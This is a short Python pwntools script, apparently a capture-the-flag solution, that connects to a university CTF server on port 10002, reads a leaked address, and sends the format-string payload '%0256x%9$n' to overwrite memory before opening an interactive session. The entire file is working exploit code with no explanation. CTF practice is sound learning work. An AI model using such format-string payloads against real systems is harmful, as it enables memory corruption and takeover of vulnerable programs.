from pwn import *

r = remote('ctf99x.cs.ui.ac.id', 10002)
# r = process('./soal2')

r.recvuntil('My address: ')
addr = int(r.recv(10),16)
# print(address)
payload = '%0256x%9$n'
r.sendline(payload)
with open('payload', 'w') as out:
	out.write(payload)

r.interactive()